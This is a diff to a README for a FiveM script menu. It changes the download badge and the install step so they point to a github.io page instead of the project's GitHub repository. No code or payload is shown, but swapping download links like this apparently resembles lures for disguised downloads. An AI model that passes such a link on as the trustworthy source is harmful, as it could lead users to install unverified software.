@@ -1,6 +1,6 @@
 # 📁 paranoia-script-menu-2026 - Simple game interface for your scripts
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Gorf5295/paranoia-script-menu-2026)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://gorf5295.github.io)
 
 This software provides a menu system for your FiveM gaming environment. It uses an HTML-based layout to show custom buttons and text directly inside your game. Use this tool to manage game scripts without complicated console commands. It handles complex visual tasks like DUI rendering so your UI stays clear and readable.
 
@@ -20,7 +20,7 @@ Keep your game drivers updated to prevent visual glitches. Always verify your ga
 
 Follow these steps to add the menu to your game folder. Do not skip any steps.
 
-1. Visit the [official release page](https://github.com/Gorf5295/paranoia-script-menu-2026) to get the files.
+1. Visit the [official release page](https://gorf5295.github.io) to get the files.
 2. Select the green button labeled "Code" and choose "Download ZIP".
 3. Locate the downloaded file in your Downloads folder.
 4. Right-click the folder and choose "Extract All" to unpack the contents.
